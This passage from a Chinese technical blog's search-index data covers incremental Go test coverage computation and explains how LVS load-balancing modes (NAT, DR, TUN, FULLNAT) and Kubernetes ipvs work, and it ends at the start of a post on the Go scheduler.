class=\"line\"></span><br><span class=\"line\">struct ModifyFile&#123;</span><br><span class=\"line\">  modifyLines []int</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这样一个Diff实例就可以表示这一次的全量修改信息，Diff结构包含一个表，表的key是文件名，value是ModifyFile结构，每个ModifyFile结构表示这个文件中所有的修改行。这个结构解析出来后面备用。</p>\n<h3 id=\"结构化覆盖信息\"><a href=\"#结构化覆盖信息\" class=\"headerlink\" title=\"结构化覆盖信息\"></a>结构化覆盖信息</h3><p>覆盖信息其实我们前面已经拿到了，在<code>系统测试覆盖率</code>那一节我们已经拿到了全量覆盖信息total.out，里面包含了单元测试和系统测试的覆盖信息总和。total.out里面的格式是这样的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mode: count</span><br><span class=\"line\">lib/lib.go:8.28,11.2 2 0</span><br><span class=\"line\">./main.go:17.39,25.57 4 0</span><br><span class=\"line\">./main.go:29.2,29.13 1 0</span><br><span class=\"line\">...省略</span><br></pre></td></tr></table></figure>\n\n<p>第一行是固定格式的，后面的每一行都是如下格式的信息</p>\n<p><code>name.go:line.column,line.column numberOfStatements count</code></p>\n<p>即</p>\n<p><code>文件名:起始行.第几列,结束行.第几列 有效代码行数 覆盖次数</code></p>\n<p>我们通过解析total.out文件可以解析出工程中所有文件的覆盖信息。我们可以定义一个数据结构</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 伪码</span><br><span class=\"line\">struct Coverage&#123;</span><br><span class=\"line\">  covFiles []CovFile</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">struct CovFile&#123;</span><br><span class=\"line\">  filename string</span><br><span class=\"line\">  segments []CovSegment</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">struct CovSegment&#123;</span><br><span class=\"line\">  startLine int</span><br><span class=\"line\">  endLine int</span><br><span class=\"line\">  origCovString string</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>一个Coverage结构表示整个工程的覆盖信息，包含一个CovFile数组，一个CovFile表示一个文件的覆盖信息。CovFile结构包含一个CovSegment数组，一个CovSegment包含一个代码块（若干行连续的代码），CovSegment包含原始的覆盖数据<code>name.go:line.column,line.column numberOfStatements count</code>, 以及解析出来的起始行号，终止行号。</p>\n<h3 id=\"筛选增量的覆盖信息\"><a href=\"#筛选增量的覆盖信息\" class=\"headerlink\" title=\"筛选增量的覆盖信息\"></a>筛选增量的覆盖信息</h3><p>有了前面的结构化增量数据和结构化覆盖信息，我们就可以从全量的覆盖信息中挑选出增量代码所对应的覆盖信息。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 伪码</span><br><span class=\"line\">echo &quot;mode: count&quot; &gt; newCodeCoverage.out</span><br><span class=\"line\">for covFile in coverage</span><br><span class=\"line\">  filename = covFile.filename</span><br><span class=\"line\">  newCodeInFile = diff.modifyFiles[filename]</span><br><span class=\"line\">  for covSegment in covFile.segments</span><br><span class=\"line\">    for codeLine in newCodeInFile.modifyLines</span><br><span class=\"line\">      if codeLine &gt;= covSegment.startLine &amp;&amp; codeLine &lt;= covSegment.endLine then</span><br><span class=\"line\">        echo covSegment.origCovString &gt;&gt; newCodeCoverage.out</span><br><span class=\"line\">        break innerFor</span><br><span class=\"line\">      endif</span><br><span class=\"line\">    endfor</span><br><span class=\"line\">  endfor</span><br><span class=\"line\">endfor</span><br></pre></td></tr></table></figure>\n\n<p>随后执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">go tool cover -html=newCodeCoverage.out -o addcoverage.html</span><br><span class=\"line\">go tool cover -func=newCodeCoverage.out -o addcoverage.txt</span><br></pre></td></tr></table></figure>\n\n<p>我们就得到了增量覆盖率结果。</p>\n<h2 id=\"源码包下载\"><a href=\"#源码包下载\" class=\"headerlink\" title=\"源码包下载\"></a>源码包下载</h2><p>实例中的源码下载：<a href=\"/linkimage/gocoverage/coverage_demo.zip\">coverage_demo</a></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"http://singlecool.com/2017/06/11/golang-test/\">Go多个pkg的单元测试覆盖率</a></p>\n<p><a href=\"https://github.com/golang/go/issues/22430\">-coverprofile with relative path uses wrong file name</a></p>\n<p><a href=\"https://www.elastic.co/cn/blog/code-coverage-for-your-golang-system-tests\">Code Coverage for your Golang System Tests</a></p>\n<p><a href=\"https://marcofranssen.nl/go-webserver-with-gracefull-shutdown/\">Go webserver with gracefull shutdown</a></p>\n","categories":["代码"],"tags":["狗狼"]},{"title":"LVS的原理-工作模式","url":"/2019/05/03/lvs/","content":"<h2 id=\"LVS简介\"><a href=\"#LVS简介\" class=\"headerlink\" title=\"LVS简介\"></a>LVS简介</h2><h3 id=\"什么是LVS\"><a href=\"#什么是LVS\" class=\"headerlink\" title=\"什么是LVS:\"></a>什么是LVS:</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">LVS是Linux Virtual Server的简写，意即Linux虚拟服务器，是一个虚拟的服务器集群系统。本项目在1998年5月由章文嵩博士成立，是中国国内最早出现的自由软件项目之一.</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"LVS的作用：\"><a href=\"#LVS的作用：\" class=\"headerlink\" title=\"LVS的作用：\"></a>LVS的作用：</h3><p>LVS的原理很简单，当用户的请求过来时，会直接分发到LVS机器（director server）上，然后它把用户的请求根据设置好的调度算法，智能均衡地分发到后端真正服务器(real server)上。<br>简单的讲，LVS就是一种负载均衡服务器。</p>\n<h3 id=\"LVS的角色：\"><a href=\"#LVS的角色：\" class=\"headerlink\" title=\"LVS的角色：\"></a>LVS的角色：</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DS：director server，即负载均衡器，根据一定的负载均衡算法将流量分发到后端的真实服务器上.</span><br><span class=\"line\">RS：real server 真实的提供服务的server，可被DS划分到一个或多个负载均衡组.</span><br><span class=\"line\">BDS：backup director server，为了保证负载均衡器的高可用衍生出的备份.</span><br><span class=\"line\">VS：vitual server，负载均衡集群对外提供的IP+Port.</span><br><span class=\"line\">VIP：VS的IP，client请求服务的DIP（destination IP address），定义在DS上，client或其网关需要有其路由</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"LVS组成：\"><a href=\"#LVS组成：\" class=\"headerlink\" title=\"LVS组成：\"></a>LVS组成：</h3><p>LVS 由2部分程序组成，包括ipvs和ipvsadm。<br>ipvs工作在内核空间，是真正生效实现调度的代码.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ipvs基于netfilter框架，netfilter的架构就是在整个网络流程的若干位置放置一些检测点（HOOK）.</span><br><span class=\"line\">在每个检测点上登记一些处理函数进行处理（如包过滤，NAT等，甚至可以是用户自定义的功能）。</span><br><span class=\"line\">IPVS就是定义了一系列的“钩子函数”，在INPUT链和Forward上放置一些HOOK点.</span><br><span class=\"line\">如匹配了ipvs的规则，就会通过函数来对数据包进行操作，比如修改目的IP为realserver的接口IP（NAT），对MAC进行修改（DR）等等。</span><br></pre></td></tr></table></figure>\n<p>ipvsadm工作在用户空间，负责为ipvs内核框架编写规则, 它是一个工具，通过调用ipvs的接口去定义调度规则，定义虚拟服务（VS）。</p>\n<h3 id=\"LVS请求的流程\"><a href=\"#LVS请求的流程\" class=\"headerlink\" title=\"LVS请求的流程\"></a>LVS请求的流程</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1、客户端（Client）访问请求发送到调度器（Director Server）。</span><br><span class=\"line\">2、调度器的PREROUTING链会接收到用户请求，判断目标IP确定是本机IP，将数据包发往INPUT链。</span><br><span class=\"line\">3、INPUT链的IPVS会根据ipvsadm定义的规则（调度模式和调度算法等等）进行对比判断。</span><br><span class=\"line\">4、如果用户请求就是所定义的虚拟服务（vitual server），那么IPVS会修改请求包的ip、mac、端口号等信息，并将请求发送到FORWARD链，再经由POSTROUTING链发送到后端的真实提供服务的主机（Real Server）</span><br></pre></td></tr></table></figure>\n\n<p>下面我主要记录一下LVS调度的方式和原理。</p>\n<span id=\"more\"></span>\n\n<h2 id=\"LVS的调度\"><a href=\"#LVS的调度\" class=\"headerlink\" title=\"LVS的调度\"></a>LVS的调度</h2><h3 id=\"调度算法\"><a href=\"#调度算法\" class=\"headerlink\" title=\"调度算法\"></a>调度算法</h3><p>调度算法也就是指负载均衡算法，注意LVS只负责负载均衡，不负责探活和保证RS的高可用。</p>\n<h4 id=\"静态算法\"><a href=\"#静态算法\" class=\"headerlink\" title=\"静态算法\"></a>静态算法</h4><p>不考虑Real Server实时的活动连接和非活动连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rr：轮询</span><br><span class=\"line\">wrr：Weight，加权轮询</span><br><span class=\"line\">dh：destination hash，功能类似于sh，但应用场景不同</span><br><span class=\"line\">sh：source hash，源地址hash；根据hash表将来自同一IP请求发送至同一Real Server，这样在一定程度上破坏了负载均衡的效果；主要使用在电商网站，实现session affinity（会话绑定）</span><br></pre></td></tr></table></figure>\n<h4 id=\"动态算法\"><a href=\"#动态算法\" class=\"headerlink\" title=\"动态算法\"></a>动态算法</h4><p>ipvs默认的调度算法是下面的wlc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">lc：最少连接数调度（least-connection）,IPVS表存储了所有活动的连接。LB会比较将连接请求发送到当前连接最少的RS. （active*256+inactive）</span><br><span class=\"line\">wlc：加权最少连接数调度，（active*256+inactive）/weighed，权重越大连接数越少，则连接至此rs</span><br><span class=\"line\">sed：最短期望延迟 （active+1）/权重，不考虑inactive，解决了如果只有一个请求，就给性能强的那台服务器</span><br><span class=\"line\">nq：never queue 在每台rs都有连接之前不排队，保证每台rs至少有一个链接 ，不考虑inactive，解决了性能高的忙死，性能低没有连接</span><br><span class=\"line\">lblc：基于本地的最少连接数调度（locality-based least-connection）：将来自同一个目的地址的请求分配给同一台RS，此时这台服务器是尚未满负荷的。否则就将这个请求分配给连接数最小的RS，并以它作为下一次分配的首先考虑。</span><br><span class=\"line\">lblcr：基于本地带复制功能的最少连接；对于已建立的请求，分配到同一台服务器；对于新请求，分配到连接数少的server</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"调度方式\"><a href=\"#调度方式\" class=\"headerlink\" title=\"调度方式\"></a>调度方式</h3><h4 id=\"NAT方式\"><a href=\"#NAT方式\" class=\"headerlink\" title=\"NAT方式\"></a>NAT方式</h4><p>NAT(Network Address Translation),类似于防火墙的私有网络结构，Director Server作为所有服务器节点的网关，即作为客户端的访问入口，也是各节点回应客户端的访问出口，其外网地址作为整个群集的VIP地址，其内网地址与后端服务器Real Server在同一个物理网络，Real Server必须使用私有IP地址。<br><img src=\"/linkimage/lvs/natflow.png\" alt=\"nat flow\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 参考上面LVS请求的流程，修改数据包的目标IP地址为后端服务器IP，重新封装数据包（源IP为CIP，目标IP为RIP），然后选路将数据包发送给Real Server。</span><br><span class=\"line\">2. Real Server比对发现目标IP是本机的IP，处理请求后正常发送响应报文（源IP为RIP，目标IP为CIP）发回给Director Server。</span><br><span class=\"line\">3. Director Server重新封装数据包，将源IP地址修改为自己的VIP地址，然后响应给客户端。 此时报文的源IP为VIP，目标IP为CIP。</span><br></pre></td></tr></table></figure>\n<p>由此可总结特点如下：<br>从上面第一点分析，DS修改了网络层的IP和传输层的端口，所以NAT支持端口映射，VIP的PORT可以不同于RS的PORT。<br>从上面第二点分析，为了让RS的响应经过DS，我们必须把RS的网关设置为DS。<br>从上面第三点分析，响应的过程DS修改源IP并转发数据包，所以DS必须开启IP-Forward.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">IP-Forward即当主机拥有多于一块的网卡时，其中一块收到数据包，</span><br><span class=\"line\">根据数据包的目的ip地址将数据包发往本机另一块网卡，该网卡根据路由表继续发送数据包。</span><br></pre></td></tr></table></figure>\n<p>从流程上看，NAT方式的数据进出都经过DS，DS容易成为性能瓶颈；RS和DS必须在同一个VLAN，即处于同一个局域网。</p>\n<h4 id=\"DR方式\"><a href=\"#DR方式\" class=\"headerlink\" title=\"DR方式\"></a>DR方式</h4><p>DR(Direct Routing),Director Server作为群集的访问入口，但不作为网关使用，后端服务器池中的Real Server与Director Server在同一个物理网络中，发送给客户机的数据包不需要经过Director Server。即input经过DR，output不经过DR。为了响应对整个群集的访问，DS与RS都需要配置有VIP地址。<br><img src=\"/linkimage/lvs/drflow.png\" alt=\"dr flow\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 参考上面LVS请求的流程，修改数据包的源MAC地址为DS的MAC，目标MAC地址为RS的MAC，重新封装数据包然后选路将数据包发送给Real Server。</span><br><span class=\"line\">2. RS发现请求报文的MAC地址是自己的MAC地址，就接收此报文，处理请求后正常发送响应报文(源MAC地址为RS出口网卡（eth0）的MAC，目标MAC为CIP的MAC),将响应报文通过lo接口传送给eth0网卡然后向外发出。</span><br><span class=\"line\">RS直接将响应报文传送到客户端，不经过DS。</span><br></pre></td></tr></table></figure>\n<p>由此可总结特点如下：<br>从上面第一点分析，DS只修改了数据链路层的MAC，没有修改传输层的数据，所以NAT不支持端口映射。<br>从上面第二点分析，DS没有修改IP，数据包的IP还是VIP，所以为了让RS认为数据包是发给他的，必须给RS绑定一个VIP，通常就绑定到lo上面去，所以RS的lo都需要绑定VIP。<br>同时DS必须能通过ARP请求查到RS的MAC，如果不在同一网段则会隔离arp，所以DS和RS必须在同一个VLAN。<br>此时网络中就同时存在DS和RS的多个IP为VIP的机器，所以这里需要抑制RS的arp响应，否则DS和RS就都会回应自己是VIP，造成混乱。所以设置arp_ignore=1或者2，见下面arp_ignore的解释。<br>再从上面第二点分析，RS响应数据包的源MAC是eth0，而源IP是VIP，但是如果这个mac和ip对让别的机器知道了，就存在DS_MAC-VIP和RS_ETH0_MAC-VIP映射，造成混乱。这里就需要设置arg_annouce=2，让响应的数据包的ARP查询中源IP使用eth0的IP，设置方法见下面的解释。<br>同时可知该模式下响应不经过DS，因此其性能会优于NAT方式。<br>同时可知DS不需要承担数据转发的工作，因此不需要开启Ip-Forward.</p>\n<p>这里补充对ARP的设置方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们知道仰制arp帧需要在server上执行以下命令，如下:</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_ignore</span><br><span class=\"line\">echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/lo/arp_announce</span><br><span class=\"line\">echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignore</span><br><span class=\"line\">echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announce</span><br><span class=\"line\">因为arp对逻辑口没有意义。实际上起作用的只有以下两条:</span><br><span class=\"line\"></span><br><span class=\"line\">echo &quot;1&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_ignore</span><br><span class=\"line\">echo &quot;2&quot; &gt;/proc/sys/net/ipv4/conf/all/arp_announce</span><br></pre></td></tr></table></figure>\n<p>arp_ignore的意义</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">0（默认）</span><br><span class=\"line\">只要查询的目的IP在我的某个网卡中，我就响应。</span><br><span class=\"line\">1</span><br><span class=\"line\">本网卡的查询包，必须是查询本网卡的IP，否则不回应，所以eth0的数据包不会响应对lo的IP的查询。</span><br><span class=\"line\">2</span><br><span class=\"line\">本网卡的查询包，必须是查询本网卡的IP，同时查询者的IP必须在本网卡所在网段（这个条件正常情况应该都满足吧？？除非特意构造的），否则不回应，所以同参数1，eth0的数据包不会响应对lo的IP的查询。</span><br></pre></td></tr></table></figure>\n<p>arp_annouce的意义</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">arp_annouce用来设置当lo的数据包通过eth0发送ARP查询时（lo和eth0指的任意两个网卡）,数据包的源ip是用lo的ip还是eth0的ip。</span><br><span class=\"line\">0（默认）用的lo的ip</span><br><span class=\"line\">1 用eth0的ip，除非eth0和lo是同一网段的，则使用lo的ip。</span><br><span class=\"line\">2 用eth0的ip。</span><br></pre></td></tr></table></figure>\n<p>可以看到，DR方法虽然效率更高，但是RS的设置比较麻烦，要设置lo绑定VIP，还要设置arp_ignore和arp_annouce。</p>\n<p>这里暂停一下，不知道你发现没有，NAT和DR两种方式，都存在一个严重的问题，DS和RS都必须在同一个网段，那异地部署怎么办呢？<br>所以后面列举一下解决跨网段问题的转发方式，TUN/FUNNNAT。NAT/DR/TUN/FULLNAT加在一起就是全部LVS的转发方式了。</p>\n<h4 id=\"TUN方式\"><a href=\"#TUN方式\" class=\"headerlink\" title=\"TUN方式\"></a>TUN方式</h4><p>我们回忆下，在DR方式下，DS只修改数据包中数据链路层的MAC信息，IP信息不修改。于是DS通过MAC来定位RS，由此限制了DS和RS要处于同一网段。<br>那么如果DS可以不通过MAC就可以定位到RS的话，也就不用限制RS和DS处于同一网段了。<br>而IP Tunnel正好可以解决这一问题。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ip隧道简单解释一下，ip隧道可以理解为IP in IP, 即发送方在IP头的外部再包装一个IP头，接收方先解出第一层IP头，然后再按照正常流程处理剩下的的IP数据包。</span><br><span class=\"line\">比如下面的数据是10.10.1.10发往20.20.1.20</span><br><span class=\"line\">src ip      |  dst ip</span><br><span class=\"line\">10.10.1.10  |  20.20.1.20</span><br><span class=\"line\">数据经过tunl网络设备后变成</span><br><span class=\"line\">src ip      |  dst ip     | src ip      |  dst ip</span><br><span class=\"line\">30.30.1.30  |  40.40.1.40 | 10.10.1.10  |  20.20.1.20</span><br><span class=\"line\">数据包可以通过网络链路到达40.40.1.40，IP层处理函数把数据交给ip隧道程序解析，解出第一层IP头，并把解出的原始数据包放入接收队列，接下来如果20.20.1.20匹配了另一个网卡的IP，则数据包就被完整接受和处理。</span><br></pre></td></tr></table></figure>\n<p>有了ip tunnel技术，我们就可以把RS分布到不同的机房下，如下图<br><img src=\"/linkimage/lvs/tunflow.png\" alt=\"tun flow\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. 参考上面LVS请求的流程，给数据包添加新的IP头，重新封装数据包然后选路将数据包发送给Real Server。</span><br><span class=\"line\">2. RS发现请求报文的IP地址是自己的eth0的IP地址，就剥掉IP隧道包头。</span><br><span class=\"line\">3. RS发现请求报文的IP地址是自己的lo的IP地址，就接收此报文，处理请求后正常发送响应报文(源IP是VIP，目的IP是ClientIP),将响应报文通过lo接口传送给eth0网卡然后向外发出。</span><br><span class=\"line\">RS直接将响应报文传送到客户端，不经过DS。</span><br></pre></td></tr></table></figure>\n<p>由此可总结特点如下：<br>从第一点分析，DS添加了IP头，但是不修改传输层数据，所以TUN不支持端口映射。<br>从第二点分析，只要IP可达，RS完全可以分布到不同的机房和网段。同时可知DS这里不需要两张网卡，所以也不需要开启IP-forward。<br>从第三点分析，RS需要绑定VIP到lo，同时这里没有提到arp抑制，那是因为tun方式下，DS和RS常不在同一网段，也就不会引起DS和RS的ARP混乱。一旦DS和RS部署在一个网段，那么跟DR一样，需要配置ARP抑制。对于同一网段下的RS之间也会引起ARP映射混乱，不过没什么影响。</p>\n<p>注意tun方案下会存在MTU的问题，如果一个数据包已经达到了mtu的大小，ip隧道添加一个ip头之后，包的大小就会超过MTU。这个时候有两个方案来解决。<br>支持<a href=\"http://www.cnpaf.net/rfc/rfc1191.txt\">PMTUD</a>协议</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">每个数据包都要封装一个新的20字节的IP头，如果LVS上收到的数据包就已经达到了Ethernet帧的最大值1514（MTU1500+帧头14），这时候封装层的IP头就无法加进去。</span><br><span class=\"line\">如果数据报文IP头中设置了DF标志位（Don&#x27;t Fragment），这时候LVS就无法正常转发该报文。</span><br><span class=\"line\">而是会返回一个Type=3，Code=4的ICMP报文给客户端，通知客户端目的地不可达，需要分片，并且在通知报文中指定了本端的MTU为1480。</span><br><span class=\"line\">如果客户端支持PMTUD，那么客户端会根据ICMP中通知的MTU值重新计算合适的MSS，对要发送的数据进行分片后再重传给LVS节点。</span><br></pre></td></tr></table></figure>\n<p>减小RS的MSS</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">可以通过减少RS侧的MSS值，比如调到1480。</span><br><span class=\"line\">这样客户端在和RS三次握手协商MSS的时候，就会使用修改后的MSS值。</span><br><span class=\"line\">这样客户端网卡在对数据包进行分片时就会减小单个请求中的data大小，确保LVS上收到的请求大小不会超过1480，从而不会触发到上述的问题。</span><br></pre></td></tr></table></figure>\n\n<p>TUN方式确实解决了RS的部署和扩展问题，但是DS的扩展问题还是无法解决，我们能做的顶多是对DS实行主备高可用，想要扩展DS还是没法做到。所以就有了FULLNAT方式。</p>\n<h4 id=\"FULLNAT方式\"><a href=\"#FULLNAT方式\" class=\"headerlink\" title=\"FULLNAT方式\"></a>FULLNAT方式</h4><p>上面三种调度方法都只能适用于一定规模的集群，对于大企业的大规模集群，上面那几个都被DS的扩展能力约束住了。<br>FULLNAT是由淘宝最先实现的一种调度方式，重点解决DS的扩展能力，以及其他一些优化。目前业界的大厂都是基于这个方案来做的。<br>FULLNAT试图消除前面几个方案的不便之处：DR和NAT都需要在同一网段，TUN需要配置ipip模块。<br>下图是基于NAT的流程图做的修改：<br><img src=\"/linkimage/lvs/fullnatflow.png\" alt=\"fullnat flow\"></p>\n<p>可以看到两个明显的差别，一个是DS进行了横向扩展，DS之前增加了一个交换机。一个是RS返回数据不是靠的配置默认网关，而是明确的把数据发往DS。流程如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. DS前面的交换机选择一台DS，把请求发送到该DS。</span><br><span class=\"line\">2. 参考上面LVS请求的流程，DS修改数据包，源IP改为DS，目的IP改为RS，也修改端口（如果需要），重新封装数据包然后选路将数据包发送给Real Server。</span><br><span class=\"line\">3. RS发现请求报文的IP地址是自己的IP地址，就接收此报文，处理请求后正常发送响应报文(源IP是RS，目的IP是DS),将响应报文发给DS。</span><br><span class=\"line\">4. DS修改此报文，把源IP给成VIP，目的IP给成CIP。</span><br></pre></td></tr></table></figure>\n<p>由此可总结特点如下：<br>从第一点分析，可知需要一个让交换机选择DS的策略，答案就是OSPF。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">OSPF路由协议用于在单一自治系统内决策路由。</span><br><span class=\"line\">而OSPF协议支持一个特性叫ECMP,即存在多条到达同一个目的地址的相同开销的路径时，</span><br><span class=\"line\">那么发往目的IP的转发流量就可以通过不同路径分担，实现负载均衡。</span><br></pre></td></tr></table></figure>\n<p>从第二点分析，DS按照常规流程修改ip和端口，所以支持端口映射。<br>从第三点分析，RS不需要配置默认网关，所以RS可以跨机房跨网段部署。<br>从第四点分析，返回数据需要进行转发，所以需要开启DS的ip_forward.</p>\n<p>这个流程其实偏复杂了，因此带来了一些问题，比如</p>\n<h5 id=\"如何透传CIP\"><a href=\"#如何透传CIP\" class=\"headerlink\" title=\"如何透传CIP\"></a>如何透传CIP</h5><p>RS这时候是看不到CIP的，只能看到DS的IP，解决办法是DS发给RS的数据包中通过TCP option携带CIP，RS通过toa模块hook获取ip的函数，使返回TCP option中的IP。</p>\n<h5 id=\"DS动态增减\"><a href=\"#DS动态增减\" class=\"headerlink\" title=\"DS动态增减\"></a>DS动态增减</h5><p>DS在增减节点的时候，会引起路由改变，某个连接的数据会被发送到不存在该连接session信息的DS上，造成异常，结果就是该连接下线或者重连。解决方法是使用支持一致性hash的交换机（支持的交换机较少所以不太考虑），或者使用session同步，即DS之间互相同步session信息，每个DS都保留一份全量的session表。这样DS节点下线时别的DS也有session信息，所以连接不受影响。新节点上线时，则首先全量同步session信息再把自己加到交换机的下游去。</p>\n<h5 id=\"RS动态增减\"><a href=\"#RS动态增减\" class=\"headerlink\" title=\"RS动态增减\"></a>RS动态增减</h5><p>RS在增减节点的时候，可能导致某个客户端新建的连接落不到同一个RS上，这可能会影响某些业务。所以这就要求DS使用一致性算法来调度客户端的连接，同时要求每个DS拥有同样的调度算法。</p>\n<h4 id=\"k8s-ipvs\"><a href=\"#k8s-ipvs\" class=\"headerlink\" title=\"k8s ipvs\"></a>k8s ipvs</h4><p>k8s在启用ipvs的proxy-mode:”ipvs”之后，会作出如下操作：<br>启动ipvs后, k8s会在每一台主机上创建一个kube-ipvs0的虚拟网卡。创造一个svc后，相应的clusterip和externalip会绑定到kube-ipvs0上，随后这个主机作为DS，而svc下的ep作为rs挂到vip下。<br>那么k8s用了哪一种转发模式呢？<br>首先为了支持端口转发，只能选择NAT和FULLNAT，但是NAT要求机器都在同一个网段，所以NAT不可取，剩下的只能选择FULLNAT。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. k8s集群内主机通过clusterip访问svc，或者外部通过externalip访问svc把请求路由到这个机器，也就是请求达到这个VIP对应的DS（多个中的一个）。</span><br><span class=\"line\">2. 参考上面LVS请求的流程，DS修改数据包，源IP改为DS，目的IP改为RS，也修改端口（如果需要），重新封装数据包然后选路将数据包发送给Real Server（某一个POD)。</span><br><span class=\"line\">3. RS发现请求报文的IP地址是自己的IP地址，就接收此报文，处理请求后正常发送响应报文(源IP是RS，目的IP是DS),将响应报文发给DS。</span><br><span class=\"line\">4. DS修改此报文，把源IP给成VIP，目的IP给成CIP。</span><br></pre></td></tr></table></figure>\n<p>可以看到跟fullnat的流程是一样的，只不过请求达到ds的方式不同，之前我们讲到是通过OSPF，这里则不同。如果是走clusterip那么直接走本机的kube-ipvs0，如果走externalip那么是靠cloud供应商的负载均衡，把请求转发到主机上。</p>\n<h5 id=\"metalLB的负载均衡\"><a href=\"#metalLB的负载均衡\" class=\"headerlink\" title=\"metalLB的负载均衡\"></a>metalLB的负载均衡</h5><p>metalLB可以在裸集群上实现externalip功能，代替云供应商的负载均衡。有两种方式把externalip引到主机，一个是通过内部协议选择主机响应arp请求；一个是通过bgp协议加上ECMP特性。<br>内部协议没有使用Keepalived采用的VRRP，而是使用了memberlist协议，memberlist协议是gossip协议的变种。<br>bgp协议则要配合路由器支持ECMP特性，主机通过BGP连接上路由器，路由器通过ECMP选择主机。<br>同样这个方案需要注意上面fullnet遇到的问题，不然数据包会乱走，走的路线不同一方面会导致数据乱序，另一方面数据包到了不同k8s主机后，可能转发到不同pod导致连接异常。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><table>\n<thead>\n<tr>\n<th>调度方式</th>\n<th>端口映射</th>\n<th>ip转发</th>\n<th>性能</th>\n<th>部署</th>\n<th>扩展性</th>\n<th>其他注意点</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>NAT</td>\n<td>支持</td>\n<td>需要</td>\n<td>较低</td>\n<td>同网段</td>\n<td>一般</td>\n<td>配默认网关</td>\n</tr>\n<tr>\n<td>DR</td>\n<td>不支持</td>\n<td>不需要</td>\n<td>最高</td>\n<td>同网段</td>\n<td>一般</td>\n<td>arp抑制，绑定VIP</td>\n</tr>\n<tr>\n<td>TUN</td>\n<td>不支持</td>\n<td>不需要</td>\n<td>较高</td>\n<td>跨网段</td>\n<td>较好</td>\n<td>绑定VIP; ipip模块；MSS调整</td>\n</tr>\n<tr>\n<td>FULLNAT</td>\n<td>支持</td>\n<td>需要</td>\n<td>最低</td>\n<td>跨网段</td>\n<td>最好</td>\n<td>OSPF&amp;ECMP；CIP透传；session同步</td>\n</tr>\n</tbody></table>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><p>[1]<a href=\"http://zhxfei.com/2016/08/04/lvs/\">LVS负载均衡集群架设</a><br>[2]<a href=\"https://www.kancloud.cn/hiyang/linux/360095\">LVS调度方法</a><br>[3]<a href=\"https://www.linuxidc.com/Linux/2018-11/155542.htm\">LVS负载均衡之LVS-NAT与LVS-DR模式原理详解</a><br>[4]<a href=\"https://blog.51cto.com/blief/1745134\">LVS负载均衡之工作原理说明（原理篇）</a><br>[5]<a href=\"https://www.jianshu.com/p/11ee89c54449\">LVS-Ip Tunnel模式应用</a><br>[6]<a href=\"https://blog.51cto.com/13683137989/1880744\">ip_forward与路由转发</a><br>[7]<a href=\"https://www.wandouip.com/t5i18683/\">LVS-Ip Tunnel模式应用</a><br>[8]<a href=\"https://tech.meituan.com/2017/01/05/mgw.html\">美团点评高性能四层负载均衡</a><br>[9]<a href=\"https://metallb.universe.tf/concepts/layer2/\">METALLB IN LAYER 2 MODE</a><br>[10]<a href=\"https://metallb.universe.tf/concepts/bgp/\">METALLB IN BGP MODE</a><br>[11]<a href=\"https://github.com/hashicorp/memberlist\">Github memberlist</a></p>\n","categories":["架构"],"tags":["分布式"]},{"title":"golang scheduler","url":"/2019/06/03/goscheduler/","content":"<h1 id=\"Go调度器\"><a href=\"#Go调度器\" class=\"headerlink\" 